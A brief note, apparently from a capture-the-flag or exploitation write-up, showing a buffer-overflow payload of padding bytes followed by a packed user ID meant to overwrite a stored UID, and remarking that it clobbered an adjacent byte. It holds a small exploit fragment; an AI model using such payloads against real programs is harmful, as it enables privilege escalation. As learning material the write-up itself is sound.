
Note: I tried to do:
ROOT_ID = 1337
payload = b"A"*24 + b"\x00"*4+p32(ROOT_ID) 	

And while it overwrote the UID correctly, it also overwrote a byte of the next line.  As a result, I chose to do it manually